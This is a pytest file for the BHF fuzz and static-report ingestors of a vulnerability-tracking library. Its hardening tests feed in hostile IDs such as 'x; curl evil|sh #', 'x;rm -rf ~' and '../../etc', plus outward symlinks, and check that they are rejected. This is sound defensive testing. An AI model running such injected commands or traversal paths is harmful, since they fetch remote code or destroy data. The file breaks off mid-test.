"""BHF (Build Harness Fuzz) fuzz + static ingestors, against real path-sanitized output.

Fixture layout (``tests/fixtures/bhf``):

* ``auto-run/`` — a ``bhf auto`` work directory: ``findings.csv`` (6 root-cause
  rows), ``findings/<id>/finding.json`` + ``testcase.bin`` and ``auto/run.json``
  (``source_root`` = ``/work/src``). The original work dir was ``/work/bhf`` and
  the BHF runtime lived at ``/opt/bhf``.
* ``static/`` — ``bhf static`` output as SARIF and native JSON (1 finding).
"""

from __future__ import annotations

import csv
import json
import shutil
from pathlib import Path

import pytest

from tarmo_vuln_core import FindingCategory, Severity, StackFrame, auto_detect, get_by_format
from tarmo_vuln_core.ingestors.base import IngestorError
from tarmo_vuln_core.ingestors.parsers import DEFAULT_REGISTRY_ORDER
from tarmo_vuln_core.ingestors.parsers.bhf import BhfIngestor, BhfStaticIngestor
from tarmo_vuln_core.ingestors.parsers.csv_finding import CsvFindingIngestor
from tarmo_vuln_core.ingestors.parsers.gnatsas import GnatSasIngestor
from tarmo_vuln_core.ingestors.parsers.manual import ManualIngestor
from tarmo_vuln_core.ingestors.parsers.pragmatic import PragmaticIngestor
from tarmo_vuln_core.ingestors.parsers.sarif import SarifIngestor
from tarmo_vuln_core.ingestors.parsers.sarp import SarpIngestor
from tarmo_vuln_core.ingestors.parsers.semgrep import SemgrepIngestor

FIXTURES = Path(__file__).parent.parent / "fixtures"
BHF = FIXTURES / "bhf"
WORK = BHF / "auto-run"
CSV_PATH = WORK / "findings.csv"
F0000 = "F-0000-c0dca483"
F0000_CLUSTER = "cc6b46c403134e693084f5d9a286b25c4a16a43ac42e5b4a61d2fde5ba8eb1ee"
STATIC_WORK = BHF / "static-run"

_CSV_ORDER = [
    "F-0000-c0dca483",
    "F-0002-1d8ca3de",
    "F-0001-bb0ed262",
    "F-0003-77f37013",
    "F-0004-8fb10837",
    "F-CAP-0000",
]


def _by_raw_ref(findings: list) -> dict:
    return {f.raw_ref: f for f in findings}


# ── BhfIngestor: detection ─────────────────────────────────────────────────────


@pytest.mark.unit
class TestBhfCanHandle:
    def setup_method(self) -> None:
        self.ing = BhfIngestor()

    def test_findings_csv(self) -> None:
        assert self.ing.can_handle(CSV_PATH) is True

    def test_work_directory(self) -> None:
        assert self.ing.can_handle(WORK) is True

    def test_single_finding_json(self) -> None:
        assert self.ing.can_handle(WORK / "findings" / F0000 / "finding.json") is True

    def test_capability_finding_json_without_signature(self) -> None:
        # F-CAP-0000 has cluster_key_full but no signature/cluster_key.
        assert self.ing.can_handle(WORK / "findings" / "F-CAP-0000" / "finding.json") is True

    def test_rejects_generic_csv(self) -> None:
        assert self.ing.can_handle(FIXTURES / "manual_findings.csv") is False
        assert self.ing.can_handle(FIXTURES / "flawfinder_real.csv") is False

    def test_rejects_csv_with_bhf_like_but_different_header(self, tmp_path: Path) -> None:
        p = tmp_path / "findings.csv"
        p.write_text("id,count,harness_id,rule_id,message\nX,1,H,R,m\n")
        assert self.ing.can_handle(p) is False

    def test_rejects_unrelated_json(self) -> None:
        assert self.ing.can_handle(FIXTURES / "manual_finding.json") is False
        assert self.ing.can_handle(FIXTURES / "trivy_real.json") is False

    def test_rejects_unrelated_directory(self, tmp_path: Path) -> None:
        (tmp_path / "notes.txt").write_text("hi")
        assert self.ing.can_handle(tmp_path) is False

    def test_rejects_static_sarif(self) -> None:
        assert self.ing.can_handle(BHF / "static" / "static-report.sarif") is False

    def test_generic_csv_ingestors_do_not_shadow_bhf(self) -> None:
        assert isinstance(auto_detect(CSV_PATH), BhfIngestor)

    def test_auto_detect_work_directory(self) -> None:
        assert isinstance(auto_detect(WORK), BhfIngestor)

    def test_auto_detect_unrelated_directory_is_rejected_not_crashed(self, tmp_path: Path) -> None:
        # Every probe must tolerate a directory (XML probes used to raise
        # IsADirectoryError out of auto_detect).
        (tmp_path / "notes.txt").write_text("hi")
        with pytest.raises(IngestorError, match="No ingestor could handle"):
            auto_detect(tmp_path)

    def test_auto_detect_single_finding_json(self) -> None:
        detected = auto_detect(WORK / "findings" / F0000 / "finding.json")
        assert isinstance(detected, BhfIngestor)

    def test_generic_csv_still_goes_to_csv_ingestor(self) -> None:
        assert isinstance(auto_detect(FIXTURES / "manual_findings.csv"), CsvFindingIngestor)


# ── BhfIngestor: findings.csv ──────────────────────────────────────────────────


@pytest.mark.unit
class TestBhfIngestCsv:
    @pytest.fixture(scope="class")
    def findings(self) -> list:
        return BhfIngestor().ingest(CSV_PATH)

    def test_one_finding_per_csv_row(self, findings: list) -> None:
        with CSV_PATH.open(newline="") as fh:
            rows = list(csv.DictReader(fh))
        assert len(rows) == 6
        assert len(findings) == 6
        assert [f.raw_ref for f in findings] == _CSV_ORDER

    def test_common_fields(self, findings: list) -> None:
        assert {f.source_tool for f in findings} == {"bhf"}
        assert {f.category for f in findings} == {FindingCategory.FUZZ}
        assert all(f.source_tools == ["bhf"] for f in findings)

    def test_f0000_core_mapping(self, findings: list) -> None:
        f = _by_raw_ref(findings)[F0000]
        assert f.title == "Heap-based Buffer Overflow in parse_record"
        assert f.severity == Severity.CRITICAL
        assert f.cwe_id == 122
        assert f.category == FindingCategory.FUZZ
        # Finding.id is derived from the cross-run cluster key, never the run-local
        # F-NNNN ordinal.
        assert f.id == f"bhf-{F0000_CLUSTER}"

    def test_f0000_title_has_no_asan_addresses(self, findings: list) -> None:
        f = _by_raw_ref(findings)[F0000]
        assert "0x" not in f.title
        assert "AddressSanitizer" not in f.title

    def test_f0000_sink_ref(self, findings: list) -> None:
        f = _by_raw_ref(findings)[F0000]
        # fix_location == sink here, so exactly one ref.
        assert len(f.source_code_refs) == 1
        ref = f.source_code_refs[0]
        assert ref.file_path == "parse.c"
        assert ref.start_line == 9
        assert ref.symbol == "parse_record"
        assert ref.is_sink is True

    def test_f0000_fuzz_evidence(self, findings: list) -> None:
        fz = _by_raw_ref(findings)[F0000].fuzz
        assert fz is not None
        assert fz.engine == "bhf"
        assert fz.finding_id == F0000
        assert fz.rule_id == "BHF-201"
        assert fz.exception_name == "ASAN_HEAP_BUFFER_OVERFLOW"
        assert fz.sanitizer == "asan"
        assert fz.classification == "unhandled"
        assert fz.verdict == "likely_reachable"
        assert fz.confidence == "medium"
        assert fz.confirmation == "fuzz"
        assert fz.harness_id == "H-C0005-3B81D475"
        assert fz.cluster_key == "cc6b46c403134e69"
        assert fz.signature == ("c0dca483634e97eccb8dc392359e31df7161004c60335111725d0d7033c4428b")
        assert fz.member_ids == []
        assert fz.cwe_ids == [122, 125]
        assert fz.prosthetics_used is False
        assert fz.reproducer_path == "findings/F-0000-c0dca483/testcase.bin"
        assert fz.replay_command == "bhf replay --finding findings/F-0000-c0dca483"

    def test_f0000_stack_is_project_frames_only(self, findings: list) -> None:
        fz = _by_raw_ref(findings)[F0000].fuzz
        assert fz is not None
        assert fz.stack == [StackFrame(file="parse.c", function="parse_record", line=9)]

    def test_no_absolute_or_runtime_paths_leak_into_stacks(self, findings: list) -> None:
        for f in findings:
            assert f.fuzz is not None
            for frame in f.fuzz.stack:
                assert frame.file is not None
                assert not frame.file.startswith("/")
                assert "harnesses" not in frame.file
                assert not frame.file.startswith("csu/")

    def test_f0000_description_and_remediation(self, findings: list) -> None:
        f = _by_raw_ref(findings)[F0000]
        assert f.description.startswith("This is a buffer overflow: while processing")
        # The sanitizer line is kept minus its ASLR-volatile address/pc/bp/sp/size
        # tail; the raw line survives in extra_fields.
        assert "Sanitizer report (asan): ERROR: AddressSanitizer: heap-buffer-overflow" in (
            f.description
        )
        assert "0x" not in f.description
        assert "READ of size" not in f.description
        assert f.extra_fields["bhf_sanitizer_message"].endswith("(READ of size 65)")
        assert f.remediation.startswith(
            "Bounds-check the index/length before the access at `parse.c:9`"
        )
        assert "/work/src" not in f.remediation
        assert "/work/src" not in f.description

    def test_f0000_tags(self, findings: list) -> None:
        tags = _by_raw_ref(findings)[F0000].tags
        assert "bhf:verdict:likely_reachable" in tags
        assert "bhf:confidence:medium" in tags
        assert "bhf:classification:unhandled" in tags
        assert "bhf:non-defect" not in tags
        assert "bhf:prosthetics" not in tags

    def test_f0000_affected_hosts_is_relative_sink_file(self, findings: list) -> None:
        assert _by_raw_ref(findings)[F0000].affected_hosts == ["parse.c"]

    def test_f0001_second_harness(self, findings: list) -> None:
        f = _by_raw_ref(findings)["F-0001-bb0ed262"]
        assert f.title == "Heap-based Buffer Overflow in sum_table"
        assert f.cwe_id == 122
        assert f.fuzz is not None
        assert f.fuzz.cwe_ids == [122, 787]
        # BHF's exception.stack appends ASAN's "allocated by" frames after the crash
        # frames; the allocation site (parse.c:14) is a project frame and is kept.
        assert f.fuzz.stack == [
            StackFrame(file="parse.c", function="sum_table", line=17),
            StackFrame(file="parse.c", function="sum_table", line=14),
        ]

    def test_f0003_sink_falls_back_to_csv_columns(self, findings: list) -> None:
        # finding.json for F-0003 has no actionability.sink; the CSV row does.
        f = _by_raw_ref(findings)["F-0003-77f37013"]
        assert f.title == "OS command injection via controlled argv/cmdline in run_cmd"
        assert f.cwe_id == 78
        assert f.fuzz is not None
        assert f.fuzz.confirmation == "runtime"
        assert f.fuzz.classification == "oracle_hit"
        assert f.fuzz.sanitizer is None
        assert f.fuzz.stack == []
        assert [(r.file_path, r.start_line, r.symbol) for r in f.source_code_refs] == [
            ("cmd.c", 4, "run_cmd")
        ]
        assert "bhf:confidence:low" in f.tags

    def test_capability_finding(self, findings: list) -> None:
        f = _by_raw_ref(findings)["F-CAP-0000"]
        assert f.severity == Severity.MEDIUM
        assert f.cwe_id == 668
        assert f.title == "Input Triggered Capability in run_cmd"
        assert f.fuzz is not None
        assert f.fuzz.cwe_ids == [668]
        assert f.fuzz.classification == "capability"
        # No testcase.bin in this finding dir.
        assert f.fuzz.reproducer_path is None
        assert f.fuzz.replay_command == "bhf replay --finding findings/F-CAP-0000"
        assert f.fuzz.prosthetics_used is None
        assert "bhf:classification:capability" in f.tags
        assert [(r.file_path, r.start_line) for r in f.source_code_refs] == [("cmd.c", 4)]

    def test_severity_distribution(self, findings: list) -> None:
        sev = [f.severity for f in findings]
        assert sev.count(Severity.CRITICAL) == 5
        assert sev.count(Severity.MEDIUM) == 1


# ── BhfIngestor: alternate inputs ──────────────────────────────────────────────


@pytest.mark.unit
class TestBhfIngestAlternateInputs:
    def test_directory_matches_csv(self) -> None:
        via_dir = BhfIngestor().ingest(WORK)
        via_csv = BhfIngestor().ingest(CSV_PATH)
        assert len(via_dir) == 6
        assert [f.raw_ref for f in via_dir] == [f.raw_ref for f in via_csv]

    def test_get_by_format_bhf_ingests_directory(self) -> None:
        ing = get_by_format("bhf")
        assert isinstance(ing, BhfIngestor)
        findings = ing.ingest(WORK)
        assert len(findings) == 6
        assert _by_raw_ref(findings)[F0000].fuzz.reproducer_path == (  # type: ignore[union-attr]
            "findings/F-0000-c0dca483/testcase.bin"
        )

    def test_directory_without_csv_groups_finding_json(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK / "findings", work / "findings")
        shutil.copytree(WORK / "auto", work / "auto")
        findings = BhfIngestor().ingest(work)
        # Every fixture finding has a distinct cluster_key_full.
        assert len(findings) == 6
        f = _by_raw_ref(findings)[F0000]
        assert f.severity == Severity.CRITICAL
        assert f.cwe_id == 122
        assert f.source_code_refs[0].file_path == "parse.c"
        cap = _by_raw_ref(findings)["F-CAP-0000"]
        # Without the CSV, CWEs come from finding.json (CWE-77 for the capability).
        assert cap.cwe_id == 77
        assert cap.severity == Severity.MEDIUM

    def test_directory_without_csv_picks_highest_impact_representative(
        self, tmp_path: Path
    ) -> None:
        work = tmp_path / "work"
        src = json.loads((WORK / "findings" / F0000 / "finding.json").read_text())
        low = json.loads(json.dumps(src))
        low["id"] = "F-0007-deadbeef"
        low["actionability"]["impact"] = "low"
        low["actionability"]["cwe"] = ["CWE-787"]
        for fid, doc in ((F0000, src), ("F-0007-deadbeef", low)):
            d = work / "findings" / fid
            d.mkdir(parents=True)
            (d / "finding.json").write_text(json.dumps(doc))
        findings = BhfIngestor(source_root=Path("/work/src")).ingest(work)
        assert len(findings) == 1
        assert findings[0].raw_ref == F0000
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].fuzz is not None
        assert findings[0].fuzz.member_ids == ["F-0007-deadbeef"]
        # Directory path matches BHF's CSV semantics: group count + CWE union.
        assert findings[0].extra_fields["bhf_count"] == 2
        assert findings[0].fuzz.cwe_ids == [122, 125, 787]

    def test_single_finding_json(self) -> None:
        findings = BhfIngestor().ingest(WORK / "findings" / F0000 / "finding.json")
        assert len(findings) == 1
        f = findings[0]
        assert f.raw_ref == F0000
        assert f.cwe_id == 122
        assert f.source_code_refs[0].file_path == "parse.c"
        assert f.fuzz is not None
        assert f.fuzz.cwe_ids == [122, 125]
        assert f.fuzz.reproducer_path == "findings/F-0000-c0dca483/testcase.bin"

    def test_csv_without_finding_dirs_falls_back_to_columns(self, tmp_path: Path) -> None:
        csv_copy = tmp_path / "findings.csv"
        shutil.copy(CSV_PATH, csv_copy)
        findings = BhfIngestor(source_root=Path("/work/src")).ingest(csv_copy)
        assert len(findings) == 6
        f = _by_raw_ref(findings)[F0000]
        assert f.severity == Severity.CRITICAL
        assert f.cwe_id == 122
        assert f.fuzz is not None
        assert f.fuzz.cwe_ids == [122, 125]
        assert f.fuzz.exception_name == "ASAN_HEAP_BUFFER_OVERFLOW"
        assert f.fuzz.reproducer_path is None
        assert f.source_code_refs[0].file_path == "parse.c"
        assert f.source_code_refs[0].symbol == "parse_record"
        # No cwe_name without finding.json → humanized exception name.
        assert f.title == "Heap Buffer Overflow in parse_record"
        assert f.remediation.startswith("Check the requested index and offset")

    def test_source_root_override(self, tmp_path: Path) -> None:
        findings = BhfIngestor(source_root=Path("/work")).ingest(CSV_PATH)
        f = _by_raw_ref(findings)[F0000]
        assert f.source_code_refs[0].file_path == "src/parse.c"
        assert f.fuzz is not None
        assert f.fuzz.stack == [StackFrame(file="src/parse.c", function="parse_record", line=9)]

    def test_target_mount_prefix_is_stripped(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK / "findings", work / "findings")
        text = CSV_PATH.read_text().replace("/work/src/", "/target/lib/")
        (work / "findings.csv").write_text(text)
        findings = BhfIngestor().ingest(work)
        f = _by_raw_ref(findings)["F-CAP-0000"]
        assert [r.file_path for r in f.source_code_refs] == ["lib/cmd.c"]

    def test_info_impact_and_prosthetics_tags(self, tmp_path: Path) -> None:
        src = json.loads((WORK / "findings" / F0000 / "finding.json").read_text())
        src["actionability"]["impact"] = "info"
        src["actionability"]["prosthetics"] = {"used": True}
        p = tmp_path / "findings" / F0000 / "finding.json"
        p.parent.mkdir(parents=True)
        p.write_text(json.dumps(src))
        [f] = BhfIngestor(source_root=Path("/work/src")).ingest(p)
        assert f.severity == Severity.INFO
        assert "bhf:non-defect" in f.tags
        assert "bhf:prosthetics" in f.tags
        assert f.fuzz is not None
        assert f.fuzz.prosthetics_used is True

    def test_intended_rejection_is_non_defect(self, tmp_path: Path) -> None:
        src = json.loads((WORK / "findings" / F0000 / "finding.json").read_text())
        src["classification"] = "intended_rejection"
        p = tmp_path / "finding.json"
        p.write_text(json.dumps(src))
        [f] = BhfIngestor(source_root=Path("/work/src")).ingest(p)
        assert "bhf:non-defect" in f.tags
        assert "bhf:classification:intended_rejection" in f.tags

    def test_unknown_impact_maps_to_medium(self, tmp_path: Path) -> None:
        src = json.loads((WORK / "findings" / F0000 / "finding.json").read_text())
        src["actionability"]["impact"] = "unknown"
        p = tmp_path / "finding.json"
        p.write_text(json.dumps(src))
        [f] = BhfIngestor(source_root=Path("/work/src")).ingest(p)
        assert f.severity == Severity.MEDIUM

    def test_missing_path_raises(self, tmp_path: Path) -> None:
        with pytest.raises(IngestorError, match="not found"):
            BhfIngestor().ingest(tmp_path / "nope.csv")

    def test_non_bhf_csv_raises(self) -> None:
        with pytest.raises(IngestorError, match="BHF findings.csv"):
            BhfIngestor().ingest(FIXTURES / "manual_findings.csv")

    def test_empty_directory_raises(self, tmp_path: Path) -> None:
        with pytest.raises(IngestorError, match="BHF work directory"):
            BhfIngestor().ingest(tmp_path)

    def test_scanner_version_absent_in_run_json(self) -> None:
        raw = (WORK / "auto" / "run.json").read_bytes()
        assert BhfIngestor().extract_scanner_version(raw) is None

    def test_scanner_version_when_present(self) -> None:
        raw = json.dumps({"schema_version": 1, "bhf_version": "0.2.32"}).encode()
        assert BhfIngestor().extract_scanner_version(raw) == "0.2.32"


# ── BhfStaticIngestor ─────────────────────────────────────────────────────────

STATIC_SARIF = BHF / "static" / "static-report.sarif"
STATIC_JSON = BHF / "static" / "static-report.json"


@pytest.mark.unit
class TestBhfStaticIngestor:
    def test_can_handle_sarif_and_json(self) -> None:
        ing = BhfStaticIngestor()
        assert ing.can_handle(STATIC_SARIF) is True
        assert ing.can_handle(STATIC_JSON) is True

    def test_does_not_claim_other_sarif(self) -> None:
        ing = BhfStaticIngestor()
        assert ing.can_handle(FIXTURES / "semgrep_real.sarif") is False
        assert ing.can_handle(FIXTURES / "sarif_real.json") is False

    def test_auto_detect_prefers_bhf_over_generic_sarif(self) -> None:
        assert isinstance(auto_detect(STATIC_SARIF), BhfStaticIngestor)
        assert isinstance(auto_detect(STATIC_JSON), BhfStaticIngestor)

    def test_get_by_format(self) -> None:
        assert isinstance(get_by_format("bhf_static"), BhfStaticIngestor)
        assert isinstance(get_by_format("bhfstatic"), BhfStaticIngestor)

    @pytest.mark.parametrize("path", [STATIC_SARIF, STATIC_JSON], ids=["sarif", "json"])
    def test_single_finding_mapping(self, path: Path) -> None:
        findings = BhfStaticIngestor().ingest(path)
        assert len(findings) == 1
        f = findings[0]
        assert f.cwe_id == 120
        assert f.category == FindingCategory.SAST
        assert f.source_tool == "bhf"
        assert f.source_tools == ["bhf"]
        # Generic SARIF maps level=error → HIGH (security-severity 7.0 → HIGH too);
        # the native JSON reports severity "high".
        assert f.severity == Severity.HIGH
        assert f.title == "Unbounded string copy (strcpy/strcat/gets) with no length limit"
        assert f.raw_ref == "BHF-401:cmd.c:9:unsafe-string-copy"
        assert f.id == "bhf-static-bhf-401-cmd-c-9-unsafe-string-copy"
        assert len(f.source_code_refs) == 1
        ref = f.source_code_refs[0]
        assert (ref.file_path, ref.start_line, ref.column) == ("cmd.c", 9, 46)
        assert ref.symbol == "copy_name"
        assert ref.is_sink is True
        assert set(f.tags) >= {
            "bhf:verdict:likely_reachable",
            "bhf:confidence:medium",
            "bhf:baseline:new",
            "bhf:triage:unreviewed",
        }
        assert f.remediation.startswith("Use a bounded copy")
        assert "strcpy/strcat/gets-style APIs without a visible bound" in f.description
        assert f.fuzz is None

    def test_scanner_version_from_sarif_driver(self) -> None:
        assert BhfStaticIngestor().extract_scanner_version(STATIC_SARIF.read_bytes()) == "0.2.32"

    def test_sarif_path_provenance_survives_customization(self, tmp_path: Path) -> None:
        """uriBaseId/originalUriBaseIds/artifact roles from the SARIF layer reach extra_fields."""
        doc = json.loads(STATIC_SARIF.read_text())
        run = doc["runs"][0]
        run["originalUriBaseIds"] = {
            "%SRCROOT%": {"uri": "file:///home/ci/work/"},
            "BUILDROOT": {"uri": "build/", "uriBaseId": "%SRCROOT%"},
        }
        run["artifacts"] = [
            {
                "location": {"uri": "gen/cmd_idl.c", "uriBaseId": "BUILDROOT"},
                "roles": ["uncontrolled"],
            }
        ]
        loc = run["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]
        loc.clear()
        loc.update({"uri": "gen/cmd_idl.c", "uriBaseId": "BUILDROOT", "index": 0})
        path = tmp_path / "static-report.sarif"
        path.write_text(json.dumps(doc))

        (f,) = BhfStaticIngestor().ingest(path)

        assert f.source_code_refs[0].file_path == "build/gen/cmd_idl.c"
        assert f.extra_fields["uri_base_id"] == "BUILDROOT"
        assert f.extra_fields["resolved_path"] == "/home/ci/work/build/gen/cmd_idl.c"
        assert f.extra_fields["generated_hint"] is True
        assert f.extra_fields["path_provenance"][0]["file_path"] == "build/gen/cmd_idl.c"
        # the BHF static keys are still there
        assert f.extra_fields["bhf_rule_id"] == "BHF-401"

    def test_generic_sarif_unaffected(self) -> None:
        findings = SarifIngestor().ingest(STATIC_SARIF)
        assert len(findings) == 1
        assert findings[0].source_tool == "sarif"
        assert findings[0].title == "bhf.static/unsafe-string-copy"


# ── Registry ordering ─────────────────────────────────────────────────────────


@pytest.mark.unit
class TestBhfRegistryOrder:
    def test_bhf_before_csv_catch_alls(self) -> None:
        idx = DEFAULT_REGISTRY_ORDER.index(BhfIngestor)
        for cls in (PragmaticIngestor, SarpIngestor, CsvFindingIngestor, ManualIngestor):
            assert idx < DEFAULT_REGISTRY_ORDER.index(cls), cls.__name__

    def test_bhf_static_before_sarif_family(self) -> None:
        idx = DEFAULT_REGISTRY_ORDER.index(BhfStaticIngestor)
        for cls in (SemgrepIngestor, GnatSasIngestor, SarifIngestor):
            assert idx < DEFAULT_REGISTRY_ORDER.index(cls), cls.__name__

    def test_exported(self) -> None:
        from tarmo_vuln_core.ingestors import parsers

        assert "BhfIngestor" in parsers.__all__
        assert "BhfStaticIngestor" in parsers.__all__


# ── Hardening regressions ─────────────────────────────────────────────────────


def _csv_rows(path: Path = CSV_PATH) -> tuple[list[str], list[dict[str, str]]]:
    with path.open(newline="", encoding="utf-8") as fh:
        reader = csv.DictReader(fh)
        return list(reader.fieldnames or []), list(reader)


def _write_csv(path: Path, fieldnames: list[str], rows: list[dict[str, str]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)


def _work_with_first_row_id(tmp_path: Path, bhf_id: str) -> Path:
    work = tmp_path / "work"
    shutil.copytree(WORK, work)
    fields, rows = _csv_rows()
    rows[0]["id"] = bhf_id
    _write_csv(work / "findings.csv", fields, rows)
    return work


def _f0000_doc() -> dict:
    return json.loads((WORK / "findings" / F0000 / "finding.json").read_text())


@pytest.mark.unit
class TestBhfIdContainment:
    """#1: the CSV ``id`` is a path component, a shell word and part of Finding.id."""

    @pytest.mark.parametrize(
        "bad_id",
        ["../../outside", "x; curl evil|sh #", "..", ".", "a/b", "-rf", "F 1"],
    )
    def test_unsafe_csv_id_raises(self, tmp_path: Path, bad_id: str) -> None:
        work = _work_with_first_row_id(tmp_path, bad_id)
        with pytest.raises(IngestorError, match=r"line 2: unsafe BHF finding id"):
            BhfIngestor().ingest(work)

    def test_absolute_csv_id_raises_ingestor_error_not_value_error(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "testcase.bin").write_bytes(b"x")
        work = _work_with_first_row_id(tmp_path, str(outside))
        with pytest.raises(IngestorError, match="unsafe BHF finding id"):
            BhfIngestor().ingest(work)

    def test_unsafe_finding_json_id_raises(self, tmp_path: Path) -> None:
        doc = _f0000_doc()
        doc["id"] = "../../etc"
        p = tmp_path / "findings" / "F-0000-c0dca483" / "finding.json"
        p.parent.mkdir(parents=True)
        p.write_text(json.dumps(doc))
        with pytest.raises(IngestorError, match="unsafe BHF finding id '../../etc'"):
            BhfIngestor(source_root=Path("/work/src")).ingest(tmp_path)

    def test_unsafe_finding_dir_name_without_doc_id_raises(self, tmp_path: Path) -> None:
        doc = _f0000_doc()
        del doc["id"]
        p = tmp_path / "findings" / "x;rm -rf ~" / "finding.json"
        p.parent.mkdir(parents=True)
        p.write_text(json.dumps(doc))
        with pytest.raises(IngestorError, match="unsafe BHF finding id"):
            BhfIngestor(source_root=Path("/work/src")).ingest(tmp_path)

    def test_symlinked_finding_json_outside_work_dir_is_not_read(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        evil = _f0000_doc()
        evil["actionability"]["cwe_name"] = "EVIL"
        evil["cluster_key"] = "evil"
        evil_path = tmp_path / "evil.json"
        evil_path.write_text(json.dumps(evil))
        target = work / "findings" / F0000 / "finding.json"
        target.unlink()
        target.symlink_to(evil_path)
        f = _by_raw_ref(BhfIngestor().ingest(work))[F0000]
        # Fell back to the CSV row: no cwe_name → humanized exception name.
        assert f.title == "Heap Buffer Overflow in parse_record"
        assert f.fuzz is not None
        assert f.fuzz.cluster_key is None

    def test_symlinked_finding_dir_is_not_followed(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        outside = tmp_path / "outside"
        shutil.copytree(WORK / "findings" / F0000, outside)
        shutil.rmtree(work / "findings" / F0000)
        (work / "findings" / F0000).symlink_to(outside, target_is_directory=True)
        f = _by_raw_ref(BhfIngestor().ingest(work))[F0000]
        assert f.fuzz is not None
        assert f.fuzz.reproducer_path is None
        assert f.fuzz.cluster_key is None

    def test_symlinked_testcase_is_not_a_reproducer(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        secret = tmp_path / "secret.bin"
        secret.write_bytes(b"secret")
        tc = work / "findings" / F0000 / "testcase.bin"
        tc.unlink()
        tc.symlink_to(secret)
        f = _by_raw_ref(BhfIngestor().ingest(work))[F0000]
        assert f.fuzz is not None
        assert f.fuzz.reproducer_path is None
        assert f.fuzz.cluster_key == "cc6b46c403134e69"

    def test_replay_command_is_a_single_quoted_argument(self) -> None:
        import shlex

        f = _by_raw_ref(BhfIngestor().ingest(CSV_PATH))[F0000]
        assert f.fuzz is not None
        assert f.fuzz.replay_command is not None
        assert shlex.split(f.fuzz.replay_command) == [
            "bhf",
            "replay",
            "--finding",
            "findings/F-0000-c0dca483",
        ]

    def test_finding_ids_are_slugs(self) -> None:
        import re

        for f in BhfIngestor().ingest(CSV_PATH):
            assert re.fullmatch(r"bhf-[a-z0-9-]+", f.id), f.id


def _deep_json(path: Path) -> Path:
    path.write_text("[" * 200_000 + "]" * 200_000)
    return path


@pytest.mark.unit
class TestBhfDeepNesting:
    """#2: RecursionError must never escape can_handle / ingest."""

    def test_static_can_handle_rejects_deep_sarif(self, tmp_path: Path) -> None:
        p = _deep_json(tmp_path / "deep.sarif")
        assert BhfStaticIngestor().can_handle(p) is False

    def test_fuzz_and_static_can_handle_reject_deep_json(self, tmp_path: Path) -> None:
        p = _deep_json(tmp_path / "deep.json")
        assert BhfIngestor().can_handle(p) is False
        assert BhfStaticIngestor().can_handle(p) is False

    def test_auto_detect_deep_sarif_does_not_crash(self, tmp_path: Path) -> None:
        p = _deep_json(tmp_path / "deep.sarif")
        try:
            detected = auto_detect(p)
        except IngestorError as exc:
            assert "No ingestor could handle" in str(exc)
        else:
            assert not isinstance(detected, (BhfIngestor, BhfStaticIngestor))

    def test_ingest_deep_json_raises_ingestor_error(self, tmp_path: Path) -> None:
        p = _deep_json(tmp_path / "finding.json")
        with pytest.raises(IngestorError, match="Failed to parse BHF finding.json"):
            BhfIngestor().ingest(p)
        s = _deep_json(tmp_path / "deep.sarif")
        with pytest.raises(IngestorError, match="Failed to parse BHF static report"):
            BhfStaticIngestor().ingest(s)

    def test_deep_finding_json_in_work_dir_raises_ingestor_error(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        _deep_json(work / "findings" / F0000 / "finding.json")
        with pytest.raises(IngestorError, match="Failed to parse BHF finding.json"):
            BhfIngestor().ingest(work)


@pytest.mark.unit
class TestBhfCsvAmplification:
    """#3: duplicate ids are rejected; finding.json is size-capped."""

    def test_duplicate_csv_id_raises(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        fields, rows = _csv_rows()
        rows.append(dict(rows[0]))
        _write_csv(work / "findings.csv", fields, rows)
        with pytest.raises(
            IngestorError, match=r"line 8: duplicate BHF finding id 'F-0000-c0dca483' \(line 2\)"
        ):
            BhfIngestor().ingest(work)

    def test_oversized_finding_json_raises(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from tarmo_vuln_core.ingestors.parsers import bhf as bhf_mod

        monkeypatch.setattr(bhf_mod, "_MAX_FINDING_JSON_BYTES", 1024)
        with pytest.raises(IngestorError, match=r"BHF finding.json .* exceeds the 1024-byte limit"):
            BhfIngestor().ingest(WORK)


def _rerun(tmp_path: Path, name: str, *, csv_only: bool = False) -> Path:
    """A second ``bhf auto`` run of the same tree: new ordinals and ASLR addresses."""
    work = tmp_path / name
    renames = {F0000: "F-0005-c0dca483", "F-CAP-0000": "F-CAP-0003"}
    addresses = {
        "0x502000000039": "0x602000001337",
        "pc 0x5886692362b6 bp 0x7fff2922beb0 sp 0x7fff2922b670": (
            "pc 0x55d1c0de0001 bp 0x7ffc11112222 sp 0x7ffc11110000"
        ),
        "(READ of size 65)": "(READ of size 3)",
    }

    def rewrite(text: str) -> str:
        for a, b in {**renames, **addresses}.items():
            text = text.replace(a, b)
        return text

    work.mkdir()
    (work / "findings.csv").write_text(rewrite(CSV_PATH.read_text()))
    if not csv_only:
        shutil.copytree(WORK / "auto", work / "auto")
        for d in (WORK / "findings").iterdir():
            dst = work / "findings" / renames.get(d.name, d.name)
            shutil.copytree(d, dst)
            (dst / "finding.json").write_text(rewrite((d / "finding.json").read_text()))
    return work


@pytest.mark.unit
class TestBhfCrossRunStability:
    """#4: two runs of the same bug produce identical id/title/description/content_hash."""

    @pytest.mark.parametrize("csv_only", [False, True], ids=["work-dir", "csv-only"])
    def test_rerun_with_new_ordinals_and_addresses_is_identical(
        self, tmp_path: Path, csv_only: bool
    ) -> None:
        run_a = BhfIngestor(source_root=Path("/work/src")).ingest(_copy_run(tmp_path, csv_only))
        run_b = BhfIngestor(source_root=Path("/work/src")).ingest(
            _rerun(tmp_path, "b", csv_only=csv_only)
        )
        # The input really changed: ordinals differ between the runs.
        assert {f.raw_ref for f in run_a} != {f.raw_ref for f in run_b}
